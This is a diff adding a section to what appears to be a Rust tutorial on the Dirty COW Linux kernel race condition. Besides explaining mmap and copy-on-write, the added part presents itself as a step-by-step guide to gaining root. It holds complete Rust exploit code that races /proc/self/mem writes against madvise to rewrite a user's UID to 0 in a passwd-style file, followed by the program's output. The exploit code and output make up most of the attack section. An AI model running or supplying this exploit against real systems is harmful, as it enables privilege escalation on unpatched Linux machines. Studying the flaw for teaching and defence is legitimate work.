@@ -9,6 +9,24 @@ To fully comprehend the Dirty COW race condition vulnerability, it is crucial to
 
 In terms of practical implications, the Dirty COW vulnerability has prompted widespread concern within the cybersecurity community. Security experts and Linux system administrators must remain careful, promptly patching affected systems and implementing robust security measures. The incident also serves as a stark reminder of the ever-evolving nature of cyber threats and the necessity for proactive defense mechanisms.
 
+## Table of Contents
+
+* [**Memory Mapping**](#1.-Memory-Mapping)
+    * [**Applications of Memory Mapping**](#1.1-Applications-of-Memory-Mapping)
+       * [**File I/O Operations**](#1.1.1-File-I/O-Operations)
+       * [**Memory-Mapped Database**](#1.1.2-Memory-Mapped-Database)
+       * [**Memory-Mapped Networking**](#1.1.3-Memory-Mapped-Networking)
+    * [**Shared and Private Memory Mapping**](#1.2-Shared-and-Private-Memory-Mapping)
+       * [**Shared Mapping with MAP_SHARED**](#1.2.1-Shared-Mapping-with-MAP_SHARED)
+       * [**Private Mapping with MAP_PRIVATE**](#1.2.2-Private-Mapping-with-MAP_PRIVATE)
+       * [**Mapping the File**](#1.2.3-Mapping-the-File)
+       * [**Unmapping Memory**](#1.2.4-Unmapping-Memory)
+       * [**Main Program**](#1.2.5-Main-Program)
+    * [**Copy On Write (COW) Mechanism**](#1.3-Copy-On-Write-(COW)-Mechanism)
+    * [**Madvise System Call and Read-Only Files**](#1.4-Madvise-System-Call-and-Read-Only-Files)
+    * [**Dirty COW Exploitation**](#1.5-Dirty-COW-Exploitation)
+* [**Conclusion**](#2.-Conclusion)
+
 ## 1. Memory Mapping
 
 Kicking off the journey to comprehend the complexities of the **Dirty COW** vulnerability necessitates a solid grasp of the foundational concept of memory mapping through the use of the [**`libc::mmap`**](https://docs.rs/libc/latest/libc/fn.mmap.html) method. Within the Unix operating system, [**`mmap`**](https://man7.org/linux/man-pages/man2/mmap.2.html) empowers the seamless integration of files or devices into a process's memory space. This mechanism plays a crucial role in shaping how data is accessed and manipulated within a computer system.
@@ -1131,6 +1149,412 @@ main()
 
 
 The above program showcases the ability to modify the mapped memory. The changes are only present in a copy of the mapped memory and do not impact the underlying file. After advising the kernel that the private copy is no longer needed using `madvise`, the page table is directed back to the original mapped memory, confirming that the updates made to the private copy are discarded. The program exhibits the secure and controlled handling of read-only memory in Rust, aligning with Rust's commitment to memory safety.
+
+### 1.5 Dirty COW Exploitation
+
+Now, let's dive into the fascinating world of playing around with the Dirty COW vulnerability, aiming to gain root privileges on ancient Linux versions. This section unfolds as a step-by-step manual, guiding you through the process of gaining ultimate control over an old Linux operating system. As we've explored earlier, Dirty COW is like a trick in the older Linux systems, granting you the power to alter any file in your grasp, provided you can read it. 
+
+This most important file, `etc/passwd`, holds user account details, featuring seven colon-separated fields in each record. Of particular interest is the third field, indicating the user ID (UID). Given the significance of UID in Linux access control, modifying this value becomes pivotal for achieving root privileges. The UID value of 0 designates the root user, regardless of the username. The crux of our exploit lies in exploiting Dirty COW to transform a non-root user's UID to 0, thereby unlocking root privileges.
+
+```sh
++-------------------+
+|                   |
+| etc/passwd file   |
+|                   |
++-------------------+
+         |
+         v
++-------------------+
+|                   |
+| Fields:           |
+| - dirtycow        |
+| - x               |
+| - 1001            |
+| - 1001            |
+| - dirty,1,11,11   |
+| - /home/dirtycow  |
+| - /bin/bash       |
+|                   |
++-------------------+
+         |
+         v
++-------------------+
+|                   |
+| User ID (UID):    |
+|   1001            |
+|                   |
++-------------------+
+         |
+         v
++-------------------+
+|                   |
+| Modify UID for    |
+| heightened        |
+| security          |
+|                   |
++-------------------+
+         |
+         v
++-------------------+
+|                   |
+| UID 0 = Root      |
+|                   |
++-------------------+
+         |
+         v
++-------------------+
+|                   |
+| Exploit Dirty COW |
+| to change UID to 0|
+|                   |
++-------------------+
+         |
+         v
++-------------------+
+|                   |
+| Unlock root       |
+| privileges        |
+|                   |
++-------------------+
+```
+
+But here's the catch. this exploit only works on the elder Linux editions, not the modern ones like the latest [**Ubuntu 22.04.1**](https://mu.releases.ubuntu.com/22.04.1/HEADER.html). As mentioned in the introduction, the more recent releases have patched this vulnerability, promoting their defenses against Dirty COW's exploits.
+
+To facilitate this experiment, let's simulate the process by creating a dummy file containing a copy of `etc/passwd`, with our target account named `dirtycow`. Subsequently, we'll delve into the complexities of memory mapping and threading setup. The `/etc/passwd` file is mapped into read-only memory, and two additional threads are created in parallel, one for writing and the other for advising the system on memory usage, as we saw in the previous section.
+
+```sh
++----------------------+
+|                      |
+| Create Dummy File    |
+| etc/passwd Copy      |
+| Target: dirtycow     |
++----------------------+
+          |
+          v
++----------------------+
+|                      |
+| Add 'dirtycow'       |
+| using adduser        |
+| Update /etc/passwd   |
++----------------------+
+          |
+          v
++----------------------+
+|                      |
+| Memory Mapping       |
+| and Threading Setup  |
++----------------------+
+          |
+          v
++----------------------+
+|                      |
+| Map /etc/passwd      |
+| to Read-Only Memory  |
++----------------------+
+          |
+          v
++----------------------+
+|                      |
+| Create Write Thread  |
+| Create Advise Thread |
++----------------------+
+          |
+          v
++----------------------+
+|                      |
+| Exploit Dirty COW    |
+| Write & Advise Loops |
++----------------------+
+```
+
+The main thread plays a pivotal role in locating the position of the `dirtycow` account record within the mapped memory using the [`std::str::find`](https://doc.rust-lang.org/std/primitive.str.html#method.find) function. Following this, two threads are created: a write thread, responsible for modifying the UID value in the memory copy, and a madvise thread to discard the private copy, enabling the page table to revert to the original mapped memory. The write thread's purpose is to replace the `dirtycow` UID value in memory with `0000`. Since the memory is of copy-on-write type, this thread alone can modify the contents in a private copy without altering the underlying `etc.txt` file. Simultaneously, the madvise thread discards the private copy, allowing the page table to reference the original mapped memory.
+
+```sh
++---------------------+
+|                     |
+| Mapped Memory       |
+|                     |
++---------------------+
+          |
+          v
++---------------------+
+|                     |
+| Main Thread         |
+| Locate 'dirtycow'   |
+| using find()        |
++---------------------+
+          |
+          v
++---------------------+
+|                     |
+| Create Write Thread |
+| Modify UID in Copy  |
++---------------------+
+          |
+          v
++---------------------+
+|                     |
+| Create Madvise      |
+| Thread              |
+| Discard Private Copy|
++---------------------+
+          |
+          v
++---------------------+
+|                     |
+| Write '0000' in     |
+| Memory Copy         |
++---------------------+
+          |
+          v
++---------------------+
+|                     |
+| Discard Private Copy|
+| and Revert to       |
+| Original Memory     |
++---------------------+
+```
+
+
+```Rust
+use libc::{
+    __errno_location, c_void, lseek, madvise, mmap, munmap, off_t, read, strerror, MADV_DONTNEED,
+    MAP_FAILED, MAP_PRIVATE, PROT_READ, SEEK_SET,
+};
+use std::ffi::CStr;
+use std::fs::{File, OpenOptions};
+use std::io;
+use std::os::unix::io::AsRawFd;
+use std::ptr;
+use std::slice;
+use std::thread;
+
+// Constants for file name, target string, and new string to overwrite `TARGET_STRING`
+const FILE_NAME: &str = "etc.txt";
+const TARGET_STRING: &str = "dirtycow:x:1001";
+const NEW_CONTENT: &[u8] = b"dirtycow:x:0000";
+
+// Function for the madvise thread
+fn perform_madvise(file_size: usize) {
+    // Memory map the file
+    let mapped_memory_ptr = memory_map_file(FILE_NAME);
+    if mapped_memory_ptr == MAP_FAILED as *mut u8 {
+        panic!("Error mapping file to memory");
+    }
+    // Continuous loop for the madvise thread
+    loop {
+        // Call madvise to discard the private copy
+        if unsafe { madvise(mapped_memory_ptr as *mut c_void, file_size, MADV_DONTNEED) } != 0 {
+            eprintln!("madvise failed: {}", std::io::Error::last_os_error());
+        }
+
+        // Read and print memory content
+        if let Ok(_) = read_memory_content(mapped_memory_ptr, 3290) {
+            println!("Madvising - Content: `dirtycow:x:1001`");
+        }
+    }
+}
+
+// Function for the write thread responsible for modifying UID value in memory copy
+unsafe fn perform_write_operation() -> io::Result<()> {
+    // Memory map the file
+    let mapped_memory = memory_map_file(FILE_NAME);
+    if mapped_memory == MAP_FAILED as *mut u8 {
+        panic!("Error mapping file to memory");
+    }
+
+    // Open the file for writing
+    let file_for_write = OpenOptions::new()
+        .read(true)
+        .write(true)
+        .open("/proc/self/mem")?;
+
+    // Get the file descriptor
+    let file_fd_for_write = file_for_write.as_raw_fd();
+
+    // Set the file pointer to the corresponding position
+    let offset = lseek(file_fd_for_write, mapped_memory as off_t, SEEK_SET);
+
+    // Check if lseek failed
+    if offset == -1 {
+        eprintln!("lseek failed: {}", std::io::Error::last_os_error());
+        std::process::exit(1);
+    }
+    // Infinite loop for continuous writing
+    loop {
+        // Write to the memory
+        let result = libc::write(
+            file_fd_for_write,
+            NEW_CONTENT.as_ptr() as *const c_void,
+            NEW_CONTENT.len() as usize,
+        );
+        println!("Trying to write `dirtycow:x:0000`...");
+
+        // Check if write failed
+        if result == -1 {
+            let error_code = *__errno_location();
+            let error_message = CStr::from_ptr(strerror(error_code)).to_string_lossy();
+            return Err(io::Error::new(
+                io::ErrorKind::Other,
+                format!("Write error: {} - {}", error_code, error_message),
+            ));
+        }
+    }
+}
+
+// Function to read memory content
+fn read_memory_content(mapped_memory: *mut u8, size: usize) -> io::Result<String> {
+    // Open the file for reading
+    let file_for_read = File::open("/proc/self/mem")?;
+
+    // Get the file descriptor
+    let file_fd_for_read = file_for_read.as_raw_fd();
+    let mut buffer = vec![0; size];
+
+    // Unsafe block to perform low-level operations
+    unsafe {
+        // Set the file pointer to the mapped memory
+        lseek(file_fd_for_read, mapped_memory as off_t, SEEK_SET);
+        // Read from the memory into the buffer
+        let result = read(file_fd_for_read, buffer.as_mut_ptr() as *mut c_void, size);
+
+        // Check if read failed
+        if result == -1 {
+            return Err(io::Error::last_os_error());
+        }
+    }
+
+    Ok(String::from_utf8_lossy(&buffer).into_owned())
+}
+
+// Function for memory mapping
+fn memory_map_file(file_name: &str) -> *mut u8 {
+    // Open the file for reading
+    let file = OpenOptions::new().read(true).open(file_name).unwrap();
+    // Get file metadata
+    let file_metadata = file.metadata().unwrap();
+
+    // Unsafe block for low-level memory mapping
+    let mapped_memory = unsafe {
+        // Use mmap to map the file into memory
+        let mapped_ptr = mmap(
+            ptr::null_mut(),
+            file_metadata.len() as usize,
+            PROT_READ,
+            MAP_PRIVATE,
+            file.as_raw_fd(),
+            0,
+        );
+
+        // Check if memory mapping failed
+        if mapped_ptr == MAP_FAILED {
+            panic!("Memory mapping failed");
+        }
+
+        mapped_ptr as *mut u8
+    };
+
+    mapped_memory
+}
+
+fn main() -> io::Result<()> {
+    unsafe {
+        // Open the file with read and write permissions
+        let file_for_open = OpenOptions::new().read(true).write(true).open(FILE_NAME)?;
+
+        // Get the size of the file
+        let file_size = file_for_open.metadata()?.len() as usize;
+
+        // Memory map the file
+        let mapped_memory_ptr = memory_map_file(FILE_NAME);
+        if mapped_memory_ptr == MAP_FAILED as *mut u8 {
+            panic!("Error mapping file to memory");
+        }
+
+        // Read file content into str
+        let file_content = std::str::from_utf8(slice::from_raw_parts(
+            mapped_memory_ptr as *const u8,
+            file_size,
+        ))
+        .unwrap();
+
+        // Check if the target string exists in the file content
+        if let Some(position) = file_content.find(TARGET_STRING) {
+            let position_ptr = mapped_memory_ptr.offset(position as isize);
+            println!("Target Area Found at Offset: {}", position);
+            println!(
+                "Target Area Content: {:?}",
+                std::str::from_utf8(slice::from_raw_parts(
+                    position_ptr as *const u8,
+                    TARGET_STRING.len()
+                ))
+            );
+
+            // Spawn a thread for the write operation
+            let write_thread_handle = thread::spawn(move || {
+                let _ = perform_write_operation();
+            });
+
+            // Spawn a thread for the madvise operation
+            let madvise_thread_handle = thread::spawn(move || {
+                perform_madvise(file_size);
+            });
+
+            // Join the write thread
+            write_thread_handle
+                .join()
+                .expect("Error joining write thread");
+
+            // Join the madvise thread
+            madvise_thread_handle
+                .join()
+                .expect("Error joining madvise thread");
+
+            // Unmap the memory
+            munmap(mapped_memory_ptr as *mut c_void, file_size);
+        } else {
+            eprintln!("Target area not found");
+            std::process::exit(1);
+        }
+    }
+    Ok(())
+}
+
+main()
+```
+
+    Target Area Found at Offset: 180
+    Target Area Content: Ok("dirtycow:x:1001")
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Madvising - Content: `dirtycow:x:1001`
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Madvising - Content: `dirtycow:x:1001`
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Madvising - Content: `dirtycow:x:1001`
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Madvising - Content: `dirtycow:x:1001`
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Madvising - Content: `dirtycow:x:1001`
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+    Trying to write `dirtycow:x:0000`...
+
+To make the attack work, we need to quickly switch between the write and madvise threads many times. The more attempts you make, the better your chances of success. This is why we use an endless loop in these threads, to keep trying and increase the odds. After the attack, in older Linux versions, the 'dirtycow' user's UID should change to 0000, giving full control as the root user. It's crucial to know that the Dirty COW trick takes advantage of a flaw in how Linux manages memory, allowing changes to files you're only supposed to read. But, keep in mind that this vulnerability has been fixed in newer Linux versions.
 
 ## 2. Conclusion
 
